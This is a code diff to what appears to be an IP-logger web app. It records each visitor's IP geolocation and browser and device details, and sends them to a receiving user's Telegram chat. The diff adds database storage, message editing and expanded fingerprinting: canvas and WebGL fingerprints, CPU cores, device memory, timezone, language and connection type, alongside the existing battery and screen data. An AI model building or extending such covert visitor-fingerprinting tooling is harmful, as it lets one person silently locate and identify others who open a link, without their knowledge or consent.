@@ -9,6 +9,7 @@ from werkzeug.utils import cached_property
 from werkzeug.routing import BaseConverter
 
 from app.config import Config
+from app.database.logs.crud import create_log
 
 
 class ParsedUserAgent(UserAgent):
@@ -40,6 +41,15 @@ class LoggerLog:
         self.ip_address = ip_address
         self.receiver_tg_id = receiver_tg_id
         self.data = self.get_main_info()
+        self.message_id = None  # Store the message ID for later editing
+        
+        # Store the log in the database
+        create_log(
+            ip_address=ip_address,
+            user_id=receiver_tg_id,
+            user_agent=user_agent,
+            data=self.data
+        )
 
     def get_main_info(self) -> dict[str, str]:
         url = f"http://ip-api.com/json/{self.ip_address}?fields=16969727"
@@ -74,21 +84,38 @@ ____________________
             .replace("False", "No")
 
     def get_second_log(self) -> str:
-        return f""" Additional info about {self.ip_address}
+        advanced_info = f""" Additional info about {self.ip_address}
 ____________________
-<b>Screen resolution:</b> {self.data["screen_width"]}x{self.data["screen_height"]}
-<b>Browser window resolution:</b> {self.data["client_width"]}x{self.data["client_height"]}
-<b>Charging percent:</b> {self.data["charging_percent"]}
-<b>Charging status:</b> {self.data["charging_status"]}
-<b>Charging time:</b> {self.data["charging_time"]}
-<b>Discharging time:</b> {self.data["discharging_time"]}
-<b>AdBlock existing:</b> {self.data["adblock"]}""" \
-            .replace("None", "undetected") \
-            .replace("True", "Yes") \
-            .replace("False", "No")
+<b>Screen resolution:</b> {self.data.get("screen_width", "unknown")}x{self.data.get("screen_height", "unknown")}
+<b>Browser window resolution:</b> {self.data.get("client_width", "unknown")}x{self.data.get("client_height", "unknown")}
+<b>Charging percent:</b> {self.data.get("charging_percent", "unknown")}
+<b>Charging status:</b> {self.data.get("charging_status", "unknown")}
+<b>Charging time:</b> {self.data.get("charging_time", "unknown")}
+<b>Discharging time:</b> {self.data.get("discharging_time", "unknown")}
+<b>AdBlock existing:</b> {self.data.get("adblock", "unknown")}"""
+
+        # Add new advanced data if available
+        if "timezone" in self.data:
+            advanced_info += f"""
+<b>Timezone (JS):</b> {self.data.get("timezone", "unknown")}
+<b>Language:</b> {self.data.get("language", "unknown")}
+<b>Platform (JS):</b> {self.data.get("platform", "unknown")}
+<b>CPU Cores:</b> {self.data.get("cores", "unknown")}
+<b>Device Memory:</b> {self.data.get("device_memory", "unknown")} GB
+<b>Connection Type:</b> {self.data.get("connection_type", "unknown")}
+<b>Do Not Track:</b> {self.data.get("do_not_track", "unknown")}
+<b>Cookies Enabled:</b> {self.data.get("cookies_enabled", "unknown")}
+<b>Touch Points:</b> {self.data.get("touch_points", "unknown")}
+<b>WebGL Info:</b> {self.data.get("webgl_vendor", "unknown")}
+<b>Canvas Fingerprint:</b> {self.data.get("canvas_fingerprint", "unknown")}"""
+
+        return advanced_info.replace("None", "undetected") \
+                           .replace("True", "Yes") \
+                           .replace("False", "No") \
+                           .replace("unknown", "Unknown")
 
     def send_message(self, msg) -> None:
-        requests.get(
+        response = requests.get(
             f"https://api.telegram.org/bot{Config.API_TOKEN}/sendMessage",
             data={
                 "text": msg,
@@ -97,6 +124,40 @@ ____________________
                 "disable_web_page_preview": True
             }
         )
+        # Store the message ID for later editing
+        if response.status_code == 200:
+            result = response.json()
+            if result.get("ok") and "result" in result:
+                self.message_id = result["result"]["message_id"]
+        return response
+    
+    def edit_message(self, msg) -> None:
+        """Edit an existing message instead of sending a new one."""
+        if self.message_id is None:
+            # If no message ID is stored, send a new message instead
+            return self.send_message(msg)
+            
+        response = requests.get(
+            f"https://api.telegram.org/bot{Config.API_TOKEN}/editMessageText",
+            data={
+                "text": msg,
+                "chat_id": self.receiver_tg_id,
+                "message_id": self.message_id,
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True
+            }
+        )
+        return response
+        
+    def get_combined_log(self) -> str:
+        """Combine main log and second log into a single message."""
+        main_log = self.get_main_log()
+        second_log = self.get_second_log()
+        
+        # Remove the header from the second log to avoid duplication
+        second_log_without_header = second_log.split("____________________", 1)[-1]
+        
+        return f"{main_log}\n{second_log_without_header}"
 
 
 class RegexConverter(BaseConverter):
